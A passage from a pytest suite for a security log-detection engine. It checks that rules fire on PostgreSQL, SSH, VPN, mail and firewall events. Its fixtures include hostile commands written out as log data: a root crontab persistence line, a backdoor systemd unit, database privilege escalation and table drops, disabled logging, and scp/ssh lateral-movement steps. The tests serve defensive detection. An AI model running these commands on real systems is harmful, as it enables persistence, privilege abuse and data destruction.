    def test_benign_package_install_or_upgrade_does_not_alert_pkg_011_or_seq_051(self, engine):
        install_evt = NormalizedEvent(
            ts=time.time(),
            host="maint-host",
            source="dpkg",
            category="process",
            action="pkg_install",
            outcome="success",
            message="Paket install: packagekit",
            fields={"package": "packagekit"},
        )
        upgrade_evt = NormalizedEvent(
            ts=install_evt.ts + 30,
            host="maint-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="apt-get",
            message="apt-get upgrade -y",
            fields={"cmdline": "apt-get upgrade -y"},
        )

        first_hits = [r.rule_id for r in engine.analyze(install_evt)]
        second_hits = [r.rule_id for r in engine.analyze(upgrade_evt)]

        assert "PKG-011" not in first_hits
        assert "SEQ-051" not in second_hits


class TestDatabaseSequenceRules:
    def test_db_login_failure_then_success_alerts_seq_018(self, engine, normalizer):
        fail_evt = normalizer.normalize(
            "Access denied for user 'alice'@'203.0.113.50' (using password: YES)",
            "mysql",
        )
        success_evt = normalizer.normalize(
            "Connect alice@203.0.113.50 on appdb using TCP/IP",
            "mysql",
        )

        engine.analyze(fail_evt)
        results = engine.analyze(success_evt)

        hits = [r.rule_id for r in results]
        assert "SEQ-018" in hits

    def test_generic_postgresql_connection_receipt_stays_db_connect(self, normalizer):
        evt = normalizer.normalize(
            "LOG:  connection received: host=203.0.113.60 port=5432",
            "postgresql",
        )

        assert evt.action == "db_connect"
        assert evt.outcome == "unknown"
        assert evt.src_ip == "203.0.113.60"


class TestPostgreSQLRuleCoverage:
    def test_postgresql_db001_auth_failure_regression(self, engine, normalizer):
        evt = normalizer.normalize(
            '2026-05-10 13:41:13.786 +03 dbhost postgres[14419] [203.0.113.77]: FATAL:  password authentication failed for user "alice"',
            "postgresql",
        )

        assert evt is not None
        assert evt.action == "db_login"
        assert evt.outcome == "failure"
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DB-001" in hits

    def test_postgresql_auth_failure_burst_triggers_thr_008(self, engine, normalizer):
        results = []
        for second in range(5):
            evt = normalizer.normalize(
                f'2026-05-10 13:41:1{second}.786 +03 dbhost postgres[{14419 + second}] [203.0.113.77]: FATAL:  password authentication failed for user "alice"',
                "postgresql",
            )
            results = engine.analyze(evt)

        hits = {r.rule_id for r in results}
        assert "THR-008" in hits

    def test_postgresql_invalid_role_attempt_alerts_db_002(self, engine, normalizer):
        evt = normalizer.normalize(
            '2026-05-10 13:42:13.786 +03 dbhost postgres[14420]: FATAL:  role "ghost_admin" does not exist',
            "postgresql",
        )

        assert evt is not None
        assert evt.action == "db_invalid_role"
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DB-002" in hits

    def test_postgresql_pg_hba_reject_alerts_db_003(self, engine, normalizer):
        evt = normalizer.normalize(
            '2026-05-10 13:43:13.786 +03 dbhost postgres[14421]: FATAL:  no pg_hba.conf entry for host "198.51.100.90", user "postgres", database "appdb", SSL encryption',
            "postgresql",
        )

        assert evt is not None
        assert evt.action == "db_hba_reject"
        assert evt.src_ip == "198.51.100.90"
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DB-003" in hits

    @pytest.mark.parametrize(
        "line",
        [
            '2026-05-10 13:44:13.786 +03 dbhost postgres[14422]: STATEMENT:  ALTER ROLE analyst SUPERUSER',
            "2026-05-10 13:44:14.786 +03 dbhost postgres[14423]: STATEMENT:  CREATE ROLE breakglass SUPERUSER LOGIN PASSWORD 'x'",
            '2026-05-10 13:44:15.786 +03 dbhost postgres[14424]: STATEMENT:  GRANT pg_execute_server_program TO analyst',
        ],
    )
    def test_postgresql_role_escalation_statements_alert_db_004(self, engine, normalizer, line):
        evt = normalizer.normalize(line, "postgresql")

        assert evt is not None
        assert evt.action == "db_role_escalation"
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DB-004" in hits

    @pytest.mark.parametrize(
        "line",
        [
            '2026-05-10 13:45:13.786 +03 dbhost postgres[14425]: STATEMENT:  DROP DATABASE customer360',
            '2026-05-10 13:45:14.786 +03 dbhost postgres[14426]: STATEMENT:  DROP TABLE public.audit_log',
            '2026-05-10 13:45:15.786 +03 dbhost postgres[14427]: STATEMENT:  TRUNCATE TABLE public.sessions',
            '2026-05-10 13:45:16.786 +03 dbhost postgres[14428]: STATEMENT:  DROP SCHEMA staging CASCADE',
        ],
    )
    def test_postgresql_destructive_statements_alert_db_005(self, engine, normalizer, line):
        evt = normalizer.normalize(line, "postgresql")

        assert evt is not None
        assert evt.action == "db_destructive_command"
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DB-005" in hits

    @pytest.mark.parametrize(
        "line",
        [
            "2026-05-10 13:46:13.786 +03 dbhost postgres[14429]: STATEMENT:  ALTER SYSTEM SET log_statement = 'none'",
            '2026-05-10 13:46:14.786 +03 dbhost postgres[14430]: STATEMENT:  SELECT pg_reload_conf()',
        ],
    )
    def test_postgresql_config_tamper_alerts_db_006(self, engine, normalizer, line):
        evt = normalizer.normalize(line, "postgresql")

        assert evt is not None
        assert evt.action == "db_config_tamper"
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DB-006" in hits

    def test_postgresql_remote_privileged_auth_failure_alerts_db_007(self, engine, normalizer):
        evt = normalizer.normalize(
            '2026-05-10 13:47:13.786 +03 dbhost postgres[14431] [198.51.100.55]: FATAL:  password authentication failed for user "postgres"',
            "postgresql",
        )

        assert evt is not None
        assert evt.fields.get("remote_client") is True
        assert evt.fields.get("privileged_user") is True
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DB-007" in hits

    @pytest.mark.parametrize(
        "line",
        [
            '2026-05-10 13:48:13.786 +03 dbhost postgres[14432]: LOG:  connection authorized: user=app database=appdb client_addr=127.0.0.1',
            '2026-05-10 13:48:14.786 +03 dbhost postgres[14433]: LOG:  checkpoint complete: wrote 120 buffers (0.7%)',
            '2026-05-10 13:48:15.786 +03 dbhost postgres[14434]: LOG:  received SIGHUP, reloading configuration files',
            '2026-05-10 13:48:16.786 +03 dbhost postgres[14435]: LOG:  could not receive data from client: Connection reset by peer',
            '2026-05-10 13:48:17.786 +03 dbhost postgres[14436]: LOG:  connection authorized: user=postgres database=postgres application_name=pg_isready client_addr=127.0.0.1',
        ],
    )
    def test_benign_postgresql_routine_lines_do_not_alert(self, engine, normalizer, line):
        evt = normalizer.normalize(line, "postgresql")
        hits = {r.rule_id for r in engine.analyze(evt)} if evt is not None else set()

        assert not ({"DB-001", "DB-002", "DB-003", "DB-004", "DB-005", "DB-006", "DB-007", "THR-008"} & hits)


class TestPostAuthAbuseSequences:
    def test_auth_success_then_authorized_keys_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 12:35:00 host sshd[2]: Accepted password for alice from 203.0.113.10 port 5555 ssh2",
            "auth.log",
        )
        persist_evt = normalizer.normalize(
            "Mar  5 12:36:00 host sudo[3]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; "
            "COMMAND=/usr/bin/tee /home/alice/.ssh/authorized_keys",
            "auth.log",
        )

        engine.analyze(login_evt)
        results = engine.analyze(persist_evt)

        hits = [r for r in results if r.rule_id == "SEQ-031"]
        assert len(hits) == 1, f"SEQ-031 tetiklenmedi: {results}"

    def test_vpn_success_then_cron_persistence_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 12:42:00 myhost openvpn[2001]: alice/198.51.100.25:54321 "
            "Peer Connection Initiated with [AF_INET]198.51.100.25:54321",
            "openvpn",
        )
        persist_evt = normalizer.normalize(
            "Mar  5 12:42:40 myhost sudo[2002]: alice : TTY=pts/1 ; PWD=/tmp ; USER=root ; "
            "COMMAND=/bin/sh -c 'echo * * * * * root /tmp/run.sh >> /etc/crontab'",
            "auth.log",
        )

        engine.analyze(login_evt)
        results = engine.analyze(persist_evt)

        hits = [r for r in results if r.rule_id == "SEQ-032"]
        assert len(hits) == 1, f"SEQ-032 tetiklenmedi: {results}"

    def test_auth_success_then_systemd_persistence_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 12:44:30 myhost sshd[2003]: Accepted password for alice from 203.0.113.20 port 4444 ssh2",
            "auth.log",
        )
        persist_evt = normalizer.normalize(
            "Mar  5 12:45:00 myhost sudo[2004]: alice : TTY=pts/2 ; PWD=/tmp ; USER=root ; "
            "COMMAND=/bin/cp backdoor.service /etc/systemd/system/backdoor.service",
            "auth.log",
        )

        engine.analyze(login_evt)
        results = engine.analyze(persist_evt)

        hits = [r for r in results if r.rule_id == "SEQ-033"]
        assert len(hits) == 1, f"SEQ-033 tetiklenmedi: {results}"

    def test_sudo_then_password_change_sequence_alerts(self, engine, normalizer):
        sudo_evt = normalizer.normalize(
            "Mar  5 12:46:00 myhost sudo[2005]: alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/passwd bob",
            "auth.log",
        )
        passwd_evt = normalizer.normalize(
            "Mar  5 12:46:20 myhost passwd[2006]: password changed for bob",
            "auth.log",
        )

        engine.analyze(sudo_evt)
        results = engine.analyze(passwd_evt)

        hits = [r for r in results if r.rule_id == "SEQ-034"]
        assert len(hits) == 1, f"SEQ-034 tetiklenmedi: {results}"

    def test_auth_success_then_sudoers_change_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 12:47:00 host sshd[2]: Accepted publickey for alice from 203.0.113.10 port 5555 ssh2",
            "auth.log",
        )
        persist_evt = normalizer.normalize(
            "Mar  5 12:47:20 host sudo[3]: alice : TTY=pts/0 ; PWD=/root ; USER=root ; "
            "COMMAND=/usr/sbin/visudo -f /etc/sudoers.d/alice",
            "auth.log",
        )

        engine.analyze(login_evt)
        results = engine.analyze(persist_evt)

        hits = [r for r in results if r.rule_id == "SEQ-035"]
        assert len(hits) == 1, f"SEQ-035 tetiklenmedi: {results}"


class TestPostAccessAbuseSequences:
    def test_vpn_success_then_sudo_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 12:50:00 myhost openvpn[2001]: alice/198.51.100.25:54321 "
            "Peer Connection Initiated with [AF_INET]198.51.100.25:54321",
            "openvpn",
        )
        sudo_evt = normalizer.normalize(
            "Mar  5 12:50:40 myhost sudo[2002]: alice : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/ls /root",
            "auth.log",
        )

        engine.analyze(login_evt)
        results = engine.analyze(sudo_evt)

        hits = [r for r in results if r.rule_id == "SEQ-036"]
        assert len(hits) == 1, f"SEQ-036 tetiklenmedi: {results}"

    def test_smtp_success_then_relay_denied_sequence_alerts(self, engine, normalizer):
        success_evt = normalizer.normalize(
            "Mar  5 12:35:15 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: "
            "SASL LOGIN authentication succeeded: sasl_username=alice",
            "mail",
        )
        reject_evt = normalizer.normalize(
            "Mar  5 12:35:20 mx1 postfix/smtpd[1234]: NOQUEUE: reject: RCPT "
            "from unknown[203.0.113.5]: 554 5.7.1 Relay access denied; "
            "from=<test@example.com> to=<root@local> proto=ESMTP helo=<evil>",
            "mail",
        )

        engine.analyze(success_evt)
        results = engine.analyze(reject_evt)

        hits = [r for r in results if r.rule_id == "SEQ-037"]
        assert len(hits) == 1, f"SEQ-037 tetiklenmedi: {results}"

class TestIdentityFirewallPolishSequences:
    def test_identity_success_then_sudo_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 12:55:00 myhost sshd[2003]: pam_sss(sshd:auth): authentication success; "
            "logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice",
            "auth.log",
        )
        sudo_evt = normalizer.normalize(
            "Mar  5 12:55:30 myhost sudo[2004]: alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/ls /root",
            "auth.log",
        )

        engine.analyze(login_evt)
        results = engine.analyze(sudo_evt)

        hits = [r for r in results if r.rule_id == "SEQ-039"]
        assert len(hits) == 1, f"SEQ-039 tetiklenmedi: {results}"

    def test_account_locked_then_later_success_sequence_alerts(self, engine, normalizer):
        locked_evt = normalizer.normalize(
            "Mar  5 12:43:20 myhost sshd[2003]: "
            "pam_winbind(sshd:auth): request failed, NT_STATUS_ACCOUNT_LOCKED_OUT "
            "for user 'EXAMPLE\\\\alice'",
            "auth.log",
        )
        success_evt = normalizer.normalize(
            "Mar  5 12:50:20 myhost sshd[2003]: pam_winbind(sshd:auth): user "
            "'EXAMPLE\\\\alice' granted access",
            "auth.log",
        )

        engine.analyze(locked_evt)
        results = engine.analyze(success_evt)

        hits = [r for r in results if r.rule_id == "SEQ-040"]
        assert len(hits) == 1, f"SEQ-040 tetiklenmedi: {results}"

    def test_repeated_identity_policy_deny_then_success_sequence_alerts(self, engine, normalizer):
        deny_evt1 = normalizer.normalize(
            "Mar  5 12:44:10 myhost sshd[2003]: pam_winbind(sshd:account): request failed, "
            "NT_STATUS_ACCOUNT_DISABLED for user 'EXAMPLE\\\\alice'",
            "auth.log",
        )
        deny_evt2 = normalizer.normalize(
            "Mar  5 12:45:10 myhost sshd[2003]: pam_winbind(sshd:account): request failed, "
            "NT_STATUS_ACCOUNT_DISABLED for user 'EXAMPLE\\\\alice'",
            "auth.log",
        )
        success_evt = normalizer.normalize(
            "Mar  5 12:46:10 myhost sshd[2003]: pam_winbind(sshd:auth): user "
            "'EXAMPLE\\\\alice' granted access",
            "auth.log",
        )

        engine.analyze(deny_evt1)
        engine.analyze(deny_evt2)
        results = engine.analyze(success_evt)

        hits = [r for r in results if r.rule_id == "SEQ-041"]
        assert len(hits) == 1, f"SEQ-041 tetiklenmedi: {results}"

    def test_firewall_burst_then_vpn_success_sequence_alerts(self, engine, normalizer):
        fw_evt1 = normalizer.normalize(
            "Mar  5 12:03:00 myhost kernel: [12345.678] REJECT IN=eth1 OUT= MAC= "
            "SRC=198.51.100.7 DST=10.0.0.2 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12345 "
            "PROTO=UDP SPT=5353 DPT=53",
            "syslog",
        )
        fw_evt2 = normalizer.normalize(
            "Mar  5 12:03:05 myhost kernel: [12346.678] DROP IN=eth1 OUT= MAC= "
            "SRC=198.51.100.7 DST=10.0.0.2 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12346 "
            "PROTO=UDP SPT=5354 DPT=53",
            "syslog",
        )
        success_evt = normalizer.normalize(
            "Mar  5 12:03:20 myhost openvpn[2001]: client1/198.51.100.7:54321 "
            "Peer Connection Initiated with [AF_INET]198.51.100.7:54321",
            "openvpn",
        )

        engine.analyze(fw_evt1)
        engine.analyze(fw_evt2)
        results = engine.analyze(success_evt)

        hits = [r for r in results if r.rule_id == "SEQ-042"]
        assert len(hits) == 1, f"SEQ-042 tetiklenmedi: {results}"

    def test_identity_success_then_password_change_persistence_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 12:57:00 myhost sshd[2003]: pam_sss(sshd:auth): authentication success; "
            "logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice",
            "auth.log",
        )
        passwd_evt = normalizer.normalize(
            "Mar  5 12:57:30 myhost passwd[2006]: password changed for alice",
            "auth.log",
        )

        engine.analyze(login_evt)
        results = engine.analyze(passwd_evt)

        hits = [r for r in results if r.rule_id == "SEQ-043"]
        assert len(hits) == 1, f"SEQ-043 tetiklenmedi: {results}"

    def test_ssh_success_then_password_change_persistence_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 12:57:00 myhost sshd[2003]: Accepted password for alice from 203.0.113.10 port 55222 ssh2",
            "auth.log",
        )
        passwd_evt = normalizer.normalize(
            "Mar  5 12:57:30 myhost passwd[2006]: password changed for alice",
            "auth.log",
        )

        engine.analyze(login_evt)
        results = engine.analyze(passwd_evt)

        hits = [r for r in results if r.rule_id == "SEQ-043"]
        assert len(hits) == 1, f"SSH sonrası SEQ-043 tetiklenmedi: {results}"

    def test_ssh_success_then_sudo_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 12:58:00 host sshd[2]: Accepted password for alice from 203.0.113.10 port 5555 ssh2",
            "auth.log",
        )
        sudo_evt = normalizer.normalize(
            "Mar  5 12:58:30 host sudo[3]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/ls /root",
            "auth.log",
        )

        engine.analyze(login_evt)
        results = engine.analyze(sudo_evt)

        hits = [r for r in results if r.rule_id == "SEQ-044"]
        assert len(hits) == 1, f"SEQ-044 tetiklenmedi: {results}"


class TestTelemetryExpansionAcceptance:
    def test_identity_vpn_mail_acceptance(self, engine, normalizer):
        sssd_fail = normalizer.normalize(
            "Mar  5 12:42:00 myhost sshd[2002]: pam_sss(sshd:auth): authentication failure; "
            "logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice",
            "auth.log",
        )
        sssd_success = normalizer.normalize(
            "Mar  5 12:42:30 myhost sshd[2002]: pam_sss(sshd:auth): authentication success; "
            "logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice",
            "auth.log",
        )
        vpn_fail = normalizer.normalize(
            "Mar  5 12:45:10 myhost kernel: wireguard: wg0: Handshake for peer peerA from 198.51.100.50:51820 "
            "did not complete after 5 seconds",
            "syslog",
        )
        vpn_success = normalizer.normalize(
            "Mar  5 12:45:20 myhost kernel: wireguard: wg0: Handshake for peer peerA from 198.51.100.50:51820 completed",
            "syslog",
        )
        mail_fail = normalizer.normalize(
            "Mar  5 12:35:10 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN "
            "authentication failed: authentication failure",
            "maillog",
        )
        mail_success = normalizer.normalize(
            "Mar  5 12:35:15 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN "
            "authentication succeeded: sasl_username=alice",
            "maillog",
        )

        assert sssd_success.fields["identity"]["mechanism"] == "sssd"
        assert vpn_success.fields["vpn"]["provider"] == "wireguard"
        assert mail_success.source == "maillog"
        assert mail_success.fields["mail"]["sasl_username"] == "alice"

        engine.analyze(sssd_fail)
        identity_hits = [r.rule_id for r in engine.analyze(sssd_success)]
        engine.analyze(vpn_fail)
        vpn_hits = [r.rule_id for r in engine.analyze(vpn_success)]
        engine.analyze(mail_fail)
        mail_hits = [r.rule_id for r in engine.analyze(mail_success)]

        assert "SEQ-021" in identity_hits
        assert "SEQ-023" in vpn_hits
        assert "SEQ-024" in mail_hits

    def test_firewall_and_snapshot_acceptance(self, engine, normalizer):
        firewall_evt = normalizer.normalize(
            "Mar  5 12:02:00 myhost kernel: nftables: DROP TABLE=inet CHAIN=input IN=eth0 OUT= "
            "SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP SPT=45678 DPT=22",
            "journald",
        )
        faillog_evt = normalizer.normalize(
            "root            3        03/05/26 12:35:00 +0300  203.0.113.5",
            "faillog",
        )
        lastlog_evt = normalizer.normalize(
            "alice           pts/0    203.0.113.10     Tue Mar  5 12:34:00 +0300 2026",
            "lastlog",
        )

        assert firewall_evt.fields["firewall"]["provider"] == "nftables"
        fw_hits = [r.rule_id for r in engine.analyze(firewall_evt)]
        assert "FW-001" in fw_hits

        assert faillog_evt.category == "unknown"
        assert lastlog_evt.category == "unknown"


class TestTelemetryClosureAcceptance:
    """
    Closure note:
    Recent small-content additions are closed with stronger signals preserved
    and low-value overlap kept out.

    Operator checklist:
    - Verify provider-specific auth failures still alert for WireGuard/OpenVPN.
    - Verify deny->success and policy/lockout aftermath chains still alert for identity/mail/VPN.
    - Verify small post-auth/post-access chains still fire only on the intended follow-on context.
    - Verify removed overlap IDs do not reappear in regression runs.
    - Verify firewall context rules still add distinct value.

    Known limits:
    - OpenVPN generic and provider-specific sequence context can still stack by design.
    - Firewall burst follow-on context is keyed by source IP and intentionally limited to auth/vpn success.
    """

    def test_cross_domain_acceptance_and_overlap_cleanup(self, engine, normalizer):
        identity_fail = normalizer.normalize(
            "Mar  5 12:42:00 myhost sshd[2002]: pam_sss(sshd:auth): authentication failure; "
            "logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice",
            "auth.log",
        )
        identity_success = normalizer.normalize(
            "Mar  5 12:42:30 myhost sshd[2002]: pam_sss(sshd:auth): authentication success; "
            "logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice",
            "auth.log",
        )
        vpn_fail = normalizer.normalize(
            "Mar  5 12:41:00 myhost openvpn[2001]: client1/198.51.100.25:54321 AUTH_FAILED",
            "openvpn",
        )
        vpn_success = normalizer.normalize(
            "Mar  5 12:42:00 myhost openvpn[2001]: client1/198.51.100.25:54321 "
            "Peer Connection Initiated with [AF_INET]198.51.100.25:54321",
            "openvpn",
        )
        vpn_disconnect = normalizer.normalize(
            "Mar  5 12:42:20 myhost openvpn[2001]: client1/198.51.100.25:54321 "
            "SIGTERM[soft,remote-exit] received, client-instance exiting",
            "openvpn",
        )
        wireguard_fail = normalizer.normalize(
            "Mar  5 12:45:10 myhost kernel: wireguard: wg0: Handshake for peer peerA "
            "from 198.51.100.50:51820 did not complete after 5 seconds",
            "syslog",
        )
        mail_fail = normalizer.normalize(
            "Mar  5 12:35:10 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN "
            "authentication failed: authentication failure",
            "mail",
        )
        mail_success = normalizer.normalize(
            "Mar  5 12:35:15 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN "
            "authentication succeeded: sasl_username=alice",
            "mail",
        )
        firewall_evt = normalizer.normalize(
            "Mar  5 12:03:00 myhost kernel: [12345.678] REJECT IN=eth1 OUT= MAC= "
            "SRC=198.51.100.7 DST=10.0.0.2 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12345 "
            "PROTO=UDP SPT=5353 DPT=53",
            "syslog",
        )
        engine.analyze(identity_fail)
        identity_hits = [r.rule_id for r in engine.analyze(identity_success)]

        engine.analyze(vpn_fail)
        vpn_success_hits = [r.rule_id for r in engine.analyze(vpn_success)]
        vpn_disconnect_hits = [r.rule_id for r in engine.analyze(vpn_disconnect)]

        wireguard_hits = [r.rule_id for r in engine.analyze(wireguard_fail)]

        engine.analyze(mail_fail)
        mail_hits = [r.rule_id for r in engine.analyze(mail_success)]

        firewall_hits = [r.rule_id for r in engine.analyze(firewall_evt)]

        assert "SEQ-021" in identity_hits
        assert "SEQ-025" not in identity_hits

        assert "SEQ-023" in vpn_success_hits
        assert "SEQ-027" in vpn_disconnect_hits
        assert "AUTH-012E" in wireguard_hits

        assert "SEQ-024" in mail_hits
        assert "SEQ-028" not in mail_hits

        assert "FW-001" in firewall_hits

    def test_recent_small_content_acceptance_and_absent_overlap(self, engine, normalizer):
        identity_success = normalizer.normalize(
            "Mar  5 12:55:00 myhost sshd[2003]: pam_sss(sshd:auth): authentication success; "
            "logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice",
            "auth.log",
        )
        identity_sudo = normalizer.normalize(
            "Mar  5 12:55:30 myhost sudo[2004]: alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/ls /root",
            "auth.log",
        )
        locked_evt = normalizer.normalize(
            "Mar  5 12:43:20 myhost sshd[2003]: "
            "pam_winbind(sshd:auth): request failed, NT_STATUS_ACCOUNT_LOCKED_OUT "
            "for user 'EXAMPLE\\\\alice'",
            "auth.log",
        )
        lock_success = normalizer.normalize(
            "Mar  5 12:50:20 myhost sshd[2003]: pam_winbind(sshd:auth): user "
            "'EXAMPLE\\\\alice' granted access",
            "auth.log",
        )
        vpn_success = normalizer.normalize(
            "Mar  5 12:50:00 myhost openvpn[2001]: alice/198.51.100.25:54321 "
            "Peer Connection Initiated with [AF_INET]198.51.100.25:54321",
            "openvpn",
        )
        vpn_sudo = normalizer.normalize(
            "Mar  5 12:50:40 myhost sudo[2002]: alice : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/ls /root",
            "auth.log",
        )
        mail_success = normalizer.normalize(
            "Mar  5 12:35:15 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: "
            "SASL LOGIN authentication succeeded: sasl_username=alice",
            "mail",
        )
        mail_reject = normalizer.normalize(
            "Mar  5 12:35:20 mx1 postfix/smtpd[1234]: NOQUEUE: reject: RCPT "
            "from unknown[203.0.113.5]: 554 5.7.1 Relay access denied; "
            "from=<test@example.com> to=<root@local> proto=ESMTP helo=<evil>",
            "mail",
        )
        fw_evt1 = normalizer.normalize(
            "Mar  5 12:03:00 myhost kernel: [12345.678] REJECT IN=eth1 OUT= MAC= "
            "SRC=198.51.100.7 DST=10.0.0.2 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12345 "
            "PROTO=UDP SPT=5353 DPT=53",
            "syslog",
        )
        fw_evt2 = normalizer.normalize(
            "Mar  5 12:03:05 myhost kernel: [12346.678] DROP IN=eth1 OUT= MAC= "
            "SRC=198.51.100.7 DST=10.0.0.2 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12346 "
            "PROTO=UDP SPT=5354 DPT=53",
            "syslog",
        )
        fw_vpn_success = normalizer.normalize(
            "Mar  5 12:03:20 myhost openvpn[2001]: client1/198.51.100.7:54321 "
            "Peer Connection Initiated with [AF_INET]198.51.100.7:54321",
            "openvpn",
        )
        service_evt = normalizer.normalize(
            "Mar  5 12:05:00 myhost systemd[1]: Created symlink "
            "/etc/systemd/system/multi-user.target.wants/backdoor.service -> "
            "/etc/systemd/system/backdoor.service.",
            "syslog",
        )

        engine.analyze(identity_success)
        identity_hits = [r.rule_id for r in engine.analyze(identity_sudo)]

        engine.analyze(locked_evt)
        lock_hits = [r.rule_id for r in engine.analyze(lock_success)]

        engine.analyze(vpn_success)
        vpn_hits = [r.rule_id for r in engine.analyze(vpn_sudo)]

        engine.analyze(mail_success)
        mail_hits = [r.rule_id for r in engine.analyze(mail_reject)]

        engine.analyze(fw_evt1)
        engine.analyze(fw_evt2)
        firewall_hits = [r.rule_id for r in engine.analyze(fw_vpn_success)]
        service_hits = [r.rule_id for r in engine.analyze(service_evt)]

        assert "SEQ-039" in identity_hits
        assert "SEQ-040" in lock_hits
        assert "SEQ-036" in vpn_hits
        assert "SEQ-037" in mail_hits
        assert "SEQ-042" in firewall_hits
        assert "ATK-PER-002" in service_hits
        assert "SEQ-025" not in identity_hits
        assert "SEQ-028" not in mail_hits


class TestLateralMovementRules:
    """ATK-LM rules should not trigger on every SSH event."""

    def test_normal_ssh_no_lm_alert(self, engine, normalizer):
        """A normal SSH login should not produce ATK-LM under the first_seen predicate."""
        raw = "Mar  5 09:00:00 server01 sshd[100]: Accepted password for alice from 10.0.0.1 port 22345 ssh2"
        evt = normalizer.normalize(raw, "auth_log")
        if evt:
            # ATK-LM-001 may trigger on the first sighting via first_seen, but not on the second one
            results1 = engine.analyze(evt)
            results2 = engine.analyze(evt)
            lm_hits2 = [r for r in results2 if r.rule_id.startswith("ATK-LM")]
            assert len(lm_hits2) == 0, f"ATK-LM ikinci SSH'de tetiklendi: {lm_hits2}"

    def test_ssh_prep_and_internal_push_alerts(self, engine):
        now = time.time()
        events = [
            _proc_evt(now + 1, "ssh-keygen -t ed25519 -f /home/alice/.ssh/id_ed25519 && ssh-copy-id alice@10.0.5.20", host="lm-attack-01"),
            _proc_evt(now + 5, "scp /tmp/bootstrap.sh alice@10.0.5.20:/tmp/bootstrap.sh", host="lm-attack-01", process="scp"),
        ]

        hits = _collect_rule_ids(engine, events)

        assert "ATK-LM-003" in hits
        assert "ATK-LM-004" in hits

    def test_git_clone_does_not_trigger_pivot_rules(self, engine):
        evt = _proc_evt(
            time.time(),
            "git clone git@github.com:example/private-repo.git",
            host="lm-benign-01",
            process="git",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "ATK-LM-003" not in hits
        assert "ATK-LM-004" not in hits


class TestDarLateralMovementDistroParity:
    @pytest.mark.parametrize(
        ("distro_family", "login_action", "prep_cmd", "prep_process", "remote_cmd", "remote_process"),
        [
            pytest.param("debian", "ssh_login", "ssh-keygen -t ed25519 -f /home/alice/.ssh/id_ed25519 && echo '10.0.5.20 db01' >> /etc/hosts", "bash", "scp /tmp/bootstrap.sh alice@10.0.5.20:/tmp/bootstrap.sh", "scp", id="debian-pivot-prep"),
            pytest.param("rhel", "identity_login", "ssh-copy-id ops@10.0.6.10", "ssh-copy-id", "rsync /var/tmp/bootstrap.sh ops@10.0.6.10:/var/tmp/bootstrap.sh", "rsync", id="rhel-pivot-prep"),
            pytest.param("suse", "vpn_login", "printf 'Host jump\\n  ProxyJump bastion\\n' >> /home/alice/.ssh/config", "printf", "ssh -J bastion alice@192.168.10.44 'sh /tmp/bootstrap.sh'", "ssh", id="suse-pivot-prep"),
        ],
    )
    def test_positive_lateral_movement_parity_per_distro(self, engine, distro_family, login_action, prep_cmd, prep_process, remote_cmd, remote_process):
        login_evt = _auth_evt(time.time(), action=login_action, outcome="success", user="alice", host=f"{distro_family}-lm-pos", distro_family=distro_family)
        prep_evt = _proc_evt(login_evt.ts + 10, prep_cmd, host=f"{distro_family}-lm-pos", user="alice", process=prep_process, distro_family=distro_family)
        remote_evt = _proc_evt(login_evt.ts + 20, remote_cmd, host=f"{distro_family}-lm-pos", user="alice", process=remote_process, distro_family=distro_family)

        login_hits = {r.rule_id for r in engine.analyze(login_evt)}
        prep_hits = {r.rule_id for r in engine.analyze(prep_evt)}
        remote_hits = {r.rule_id for r in engine.analyze(remote_evt)}
        hits = login_hits | prep_hits | remote_hits

        assert "ATK-LM-003" in hits
        assert "ATK-LM-004" in hits
        assert "SEQ-060" in hits

    @pytest.mark.parametrize(
        ("distro_family", "login_action", "prep_cmd", "prep_process", "remote_cmd", "remote_process"),
        [
